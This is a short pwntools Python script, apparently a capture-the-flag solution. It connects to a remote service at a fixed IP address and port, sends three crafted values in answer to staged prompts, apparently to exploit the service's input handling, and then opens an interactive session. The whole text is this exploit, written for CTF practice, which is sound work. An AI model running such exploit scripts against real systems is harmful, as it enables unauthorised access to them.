from pwn import *

stage1 = 1048577
stage2 = '100 256 4207849484'
stage3 = 6295676

p = remote('140.110.112.192', 2117)

p.sendlineafter('1\n', str(stage1))
p.sendlineafter('2\n', stage2)
p.sendlineafter('3\n', str(stage3))

p.interactive()
p.close()